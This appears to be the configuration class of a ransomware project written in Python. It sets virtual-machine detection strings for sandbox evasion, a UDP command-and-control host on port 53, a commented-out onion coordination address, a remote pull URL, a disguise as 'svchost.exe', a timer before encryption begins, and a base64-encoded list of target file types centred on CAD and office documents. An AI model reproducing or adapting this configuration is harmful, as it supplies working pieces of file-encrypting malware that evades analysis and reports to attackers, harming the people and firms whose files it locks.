class Config:
	VIRT_SIGNS = ['vmware', 'virtualbox', 'virtualpc', 'solaris', 'qemu']
	MAX_FILE_SIZE_MB = 750
	MIN_FILE_SIZE_MB = 0.001
	VER = 0x01
	SIGN = b'SGN'
	HEADER = "3s1B1I1L2048s"
	UDP_IP = "vault32.biz"
	INI = 'midi.ini'
	UDP_PORT = 53
	IS_RELEASE = False
	SLEEP_TIME_UNTIL_ENCRYPTION_MINUTES = 1
	COORDINATION_SERVER = 'ya.ru'  # 'kb5eceekyonjsv5p.onion'
	PULL_URL = f"http://kilitary.ru/pull/?ver={VER}"
	EXE_NAME = "svchost.exe"
	DEV_HOST = "032E02B4-0499-054D-7106-AA0700080009"
	SKIP = ['recycle.bin\\', 'program files\\', 'windows\\', 'programdata\\', 'appdata\\', 'recovery\\', 'temp\\']
	# EXTENSIONS = "pdf" #"xlsx|doc|docx|pdf|xls|psd|ppt|dwg|bak|123d|12da|3ds|3mf|3ps|a3s|sat|adsk|abc|alg|amf|apf|smt|axm|c4d" \
	# "|c4x|cam360|model|session|CATPart|CATProduct|csb|dae|ddx|ddz|dgk|dgn|dmt|dtm|dwf|dwfx|dwg|dxf|f3d|f3z|fbx|fil|glb|gltf|gpk|g|iam|idw|ifc|iga|igs" \
	# "|iges|imx|ipt|iv|jt|kml|kmz|ma|max|mb|mfr|mix|nwd|nwf|nwc|prt|osb|x_t|x_b|ai|ply|prt|asm|qsm|rcm|rfa|3dm|rvt|sdf|shoe|shp|sim|sim360|skp|smesh|smt|par" \
	# "|sldprt|sldasm|prt|scdoc|stp|step|stl|stla|stlb|thing|tin|top|cam|tsm|u3d|vda|wrl|wrz|vtfx|vue|wire|xgl|zgl"
	# ORIG="ZGJmfGRifG15aXxpYmR8eGxzeHxkb2N8ZG9jeHxwZGZ8eGxzfHBzZHxwcHR8ZHdnfGJha3wxMjNkfDEyZGF8M2RzfDNtZnwzcHN8YTNzfHNhdHxhZHNrfGFiY3xhbGd8YW1mfGFwZnxzbXR8YXhtfGM0ZHxjNHh8Y2FtMzYwfG1vZGVsfHNlc3Npb258Q0FUUGFydHxDQVRQcm9kdWN0fGNzYnxkYWV8ZGR4fGRkenxkZ2t8ZGdufGRtdHxkdG18ZHdmfGR3Znh8ZHdnfGR4ZnxmM2R8ZjN6fGZieHxmaWx8Z2xifGdsdGZ8Z3BrfGd8aWFtfGlkd3xpZmN8aWdhfGlnc3xpZ2VzfGlteHxpcHR8aXZ8anR8a21sfGttenxtYXxtYXh8bWJ8bWZyfG1peHxud2R8bndmfG53Y3xwcnR8b3NifHhfdHx4X2J8YWl8cGx5fHBydHxhc218cXNtfHJjbXxyZmF8M2RtfHJ2dHxzZGZ8c2hvZXxzaHB8c2ltfHNpbTM2MHxza3B8c21lc2h8c210fHBhcnxzbGRwcnR8c2xkYXNtfHBydHxzY2RvY3xzdHB8c3RlcHxzdGx8c3RsYXxzdGxifHRoaW5nfHRpbnx0b3B8Y2FtfHRzbXx1M2R8dmRhfHdybHx3cnp8dnRmeHx2dWV8d2lyZXx4Z2x8emds"
	# eGxzeHxkb2N8ZG9jeHxwZGZ8eGxzfHBzZHxwcHR8ZHdnfGJha3wxMjNkfDEyZGF8M2RzfDNtZnwzcHN8YTNzfHNhdHxhZHNrfGFiY3xhbGd8YW1mfGFwZnxzbXR8YXhtfGM0ZHxjNHh8Y2FtMzYwfG1vZGVsfHNlc3Npb258Q0FUUGFydHxDQVRQcm9kdWN0fGNzYnxkYWV8ZGR4fGRkenxkZ2t8ZGdufGRtdHxkdG18ZHdmfGR3Znh8ZHdnfGR4ZnxmM2R8ZjN6fGZieHxmaWx8Z2xifGdsdGZ8Z3BrfGd8aWFtfGlkd3xpZmN8aWdhfGlnc3xpZ2VzfGlteHxpcHR8aXZ8anR8a21sfGttenxtYXxtYXh8bWJ8bWZyfG1peHxud2R8bndmfG53Y3xwcnR8b3NifHhfdHx4X2J8YWl8cGx5fHBydHxhc218cXNtfHJjbXxyZmF8M2RtfHJ2dHxzZGZ8c2hvZXxzaHB8c2ltfHNpbTM2MHxza3B8c21lc2h8c210fHBhcnxzbGRwcnR8c2xkYXNtfHBydHxzY2RvY3xzdHB8c3RlcHxzdGx8c3RsYXxzdGxifHRoaW5nfHRpbnx0b3B8Y2FtfHRzbXx1M2R8dmRhfHdybHx3cnp8dnRmeHx2dWV8d2lyZXx4Z2x8emds
	EXTENSIONS_ENCODED = "ZGJmfGRifG15aXxpYmR8eGxzeHxkb2N8ZG9jeHxwZGZ8eGxzfHBzZHxwcHR8ZHdnfGJha3wxMjNkfDEyZGF8M2RzfDNtZnwzcHN8YTNzfHNhdHxhZHNrfGFiY3xhbGd8YW1mfGFwZnxzbXR8YXhtfGM0ZHxjNHh8Y2FtMzYwfG1vZGVsfHNlc3Npb258Q0FUUGFydHxDQVRQcm9kdWN0fGNzYnxkYWV8ZGR4fGRkenxkZ2t8ZGdufGRtdHxkdG18ZHdmfGR3Znh8ZHdnfGR4ZnxmM2R8ZjN6fGZieHxmaWx8Z2xifGdsdGZ8Z3BrfGd8aWFtfGlkd3xpZmN8aWdhfGlnc3xpZ2VzfGlteHxpcHR8aXZ8anR8a21sfGttenxtYXxtYXh8bWJ8bWZyfG1peHxud2R8bndmfG53Y3xwcnR8b3NifHhfdHx4X2J8YWl8cGx5fHBydHxhc218cXNtfHJjbXxyZmF8M2RtfHJ2dHxzZGZ8c2hvZXxzaHB8c2ltfHNpbTM2MHxza3B8c21lc2h8c210fHBhcnxzbGRwcnR8c2xkYXNtfHBydHxzY2RvY3xzdHB8c3RlcHxzdGx8c3RsYXxzdGxifHRoaW5nfHRpbnx0b3B8Y2FtfHRzbXx1M2R8dmRhfHdybHx3cnp8dnRmeHx2dWV8d2lyZXx4Z2x8emds"
# EXTENSIONS_ENCODED = "eGxzeHxkb2N8ZG9jeHxwZGZ8eGxzfHBzZHxwcHR8ZHdnfGJha3wxMjNkfDEyZGF8M2RzfDNtZnwzcHN8YTNzfHNhdHxhZHNrfGFiY3xhbGd8YW1mfGFwZnxzbXR8YXhtfGM0Z" \
#                      "HxjNHh8Y2FtMzYwfG1vZGVsfHNlc3Npb258Q0FUUGFydHxDQVRQcm9kdWN0fGNzYnxkYWV8ZGR4fGRkenxkZ2t8ZGdufGRtdHxkdG18ZHdmfGR3Znh8ZHdnfGR4ZnxmM2R8ZjN6fGZieHxmaWx8Z2xifG" \
#                      "dsdGZ8Z3BrfGd8aWFtfGlkd3xpZmN8aWdhfGlnc3xpZ2VzfGlteHxpcHR8aXZ8anR8a21sfGttenxtYXxtYXh8bWJ8bWZyfG1peHxud2R8bndmfG53Y3xwcnR8b3NifHhfdHx4X2J8YWl8cGx5fHBydHxhc218cXNt" \
#                      "fHJjbXxyZmF8M2RtfHJ2dHxzZGZ8c2hvZXxzaHB8c2ltfHNpbTM2MHxza3B8c21lc2h8c210fHBhcnxzbGRwcnR8c2xkYXNtfHBydHxzY2RvY3xzdHB8c3RlcHxzdGx8c3RsYXxzdGxifHRoaW5nfHRpbnx0b3B8Y2FtfH" \
#                      "RzbXx1M2R8dmRhfHdybHx3cnp8dnRmeHx2dWV8d2lyZXx4Z2x8emds"
# EXTENSIONS_ENCODED = "dDNzdHx0ZXN0"
